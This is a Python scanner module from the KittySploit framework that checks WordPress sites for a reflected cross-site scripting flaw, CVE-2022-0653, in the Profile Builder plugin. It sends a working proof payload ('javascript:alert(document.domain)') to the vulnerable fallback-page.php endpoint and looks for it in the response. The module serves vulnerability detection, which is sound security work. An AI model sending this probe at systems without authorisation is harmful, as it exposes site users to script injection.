#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Profile Builder User Profile & User Registration Forms WordPress plugin is vulnerable to cross-site script."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wordpress Profile Builder Plugin Cross-Site Scripting Detection',
        'description': 'The Profile Builder User Profile & User Registration Forms WordPress plugin is vulnerable to cross-site scripting due to insufficient escaping and sanitization of the site_url parameter found in the ~/assets/misc/fallback-page.php file which allows attackers to inject arbitrary web scripts onto a pages that executes whenever a user clicks on a specially crafted link by an attacker. This affects versions up to and including 3.6.1..',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'xss', 'wp-plugin', 'cozmoslabs', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-0653',
            'https://www.wordfence.com/blog/2022/02/reflected-cross-site-scripting-vulnerability-patched-in-wordpress-profile-builder-plugin/',
            'https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2655168%40profile-builder&new=2655168%40profile-builder&sfp_email=&sfph_mail=',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0653',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<a href="javascript:alert(document.domain);">here</a>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Wordpress Profile Builder Plugin Cross-Site Scripting detected",
                path='/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404',
            )
            return True
        return False

